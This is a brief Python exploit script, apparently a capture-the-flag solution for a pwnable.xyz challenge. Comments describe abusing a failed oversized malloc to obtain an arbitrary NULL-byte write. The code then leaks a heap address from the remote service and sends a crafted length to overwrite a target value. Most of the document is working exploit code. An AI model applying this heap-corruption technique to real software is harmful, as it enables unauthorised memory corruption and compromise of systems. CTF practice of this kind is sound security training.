###Braintwister lol
###The target of this problem is to overwrite a prewritten value at given location
###The program provides a chance to malloc arbitrary size, write into chunk, and automatically NULL terminates it
###Main catch is that by mallocing legal chunks, there is no chance to overlap the given address and overwrite value
###However, by intentionally failing malloc(malloced size too large), it is possible to gain an arbitrary NULL byte write(NULL terminate)


from pwn import *

r = remote('svc.pwnable.xyz',30000)
heap= int(r.recvuntil('\nLength',drop=True).split(b'0x')[1],16)
r.sendlineafter('message: ',str(heap+1))
r.sendafter('message: ','M30W')

r.interactive()
